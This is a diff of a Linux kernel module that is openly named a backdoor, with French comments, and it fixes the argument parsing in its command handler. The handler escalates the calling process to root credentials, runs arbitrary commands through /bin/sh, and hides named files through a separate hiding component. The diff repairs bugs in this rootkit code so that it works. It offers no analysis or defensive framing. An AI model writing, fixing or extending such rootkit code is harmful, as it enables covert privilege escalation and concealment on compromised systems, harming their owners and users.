@@ -1,9 +1,8 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/cred.h>
-#include <linux/slab.h>
 #include <linux/string.h>
-#include <linux/kthread.h>
+#include <linux/slab.h>
 #include "backdoor.h"
 #include "hide.h"
 
@@ -19,7 +18,6 @@ static void set_root_creds(void) {
 }
 
 static void exec_command(const char *cmd) {
-    // call_usermodehelper
     char *argv[] = {"/bin/sh", "-c", (char *)cmd, NULL};
     static char *envp[] = {
         "HOME=/", "TERM=xterm", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL
@@ -28,33 +26,38 @@ static void exec_command(const char *cmd) {
 }
 
 void handle_command(const char *cmd_line) {
-    // cmd_line pourrait être "root", "exec whoami", "hide /secret"
     char *buf, *token;
-    char *saveptr;
+    char **args;
     int argc = 0;
+    int i = 0;
 
     buf = kstrdup(cmd_line, GFP_KERNEL);
     if (!buf) return;
 
     // Compter les arguments
-    token = buf;
-    while ((token = strsep(&token, " ")) != NULL) argc++;
+    {
+        char *tmp = buf;
+        while ((token = strsep(&tmp, " ")) != NULL) {
+            if (*token != '\0')
+                argc++;
+        }
+    }
 
     kfree(buf);
     buf = kstrdup(cmd_line, GFP_KERNEL);
     if (!buf) return;
 
-    char **args = kmalloc_array(argc, sizeof(char *), GFP_KERNEL);
+    args = kmalloc_array(argc, sizeof(char *), GFP_KERNEL);
     if (!args) {
         kfree(buf);
         return;
     }
 
-    int i = 0;
-    token = buf;
-    while ((token = strsep(&token, " ")) != NULL) {
-        if (*token != '\0') {
-            args[i++] = token;
+    {
+        char *tmp = buf;
+        while ((token = strsep(&tmp, " ")) != NULL) {
+            if (*token != '\0')
+                args[i++] = token;
         }
     }
 
@@ -67,10 +70,9 @@ void handle_command(const char *cmd_line) {
     if (strcmp(args[0], "root") == 0) {
         set_root_creds();
     } else if (strcmp(args[0], "exec") == 0 && i > 1) {
-        // Reconstituer la commande
-        char *cmd_str = strsep(&cmd_line, " ");
-        cmd_str = (char *)cmd_line; // pointer après "exec"
-        exec_command(cmd_str);
+        // Reconstruire la commande complète à partir de cmd_line après "exec"
+        const char *exec_cmd = cmd_line + 5; // "exec " est 5 chars
+        exec_command(exec_cmd);
     } else if (strcmp(args[0], "hide") == 0 && i > 1) {
         hide_add_file(args[1]);
     }
@@ -80,9 +82,8 @@ void handle_command(const char *cmd_line) {
 }
 
 int init_backdoor(void) {
-    return 0; // rien de spécial ici
+    return 0; 
 }
 
 void cleanup_backdoor(void) {
-    // rien à faire
 }
